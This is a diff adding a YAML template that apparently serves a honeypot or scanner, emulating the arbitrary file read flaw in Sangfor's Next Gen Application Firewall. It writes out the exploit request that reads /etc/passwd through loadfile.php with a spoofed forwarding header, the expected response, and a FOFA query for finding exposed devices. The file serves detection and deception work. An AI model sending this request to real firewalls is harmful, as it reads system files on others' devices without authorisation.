@@ -1,0 +1,27 @@
+id: sangfor-nextgen-lfi
+info:
+  name: Sangfor Next Gen Application Firewall - Arbitary File Read
+  author: DhiyaneshDk
+  description: 'Sangfor Next Gen Application Firewall is susceptible to Local File
+    Inclusion as it does not validate the file parameter.
+
+    '
+  severity: high
+  reference:
+  - https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="SANGFOR | NGAF"
+  tags: sangfor,lfi
+traps:
+- request:
+    method: GET
+    path: /svpn_html/loadfile.php?file=/etc/./passwd
+    headers:
+      y-forwarded-for: 127.0.0.1
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
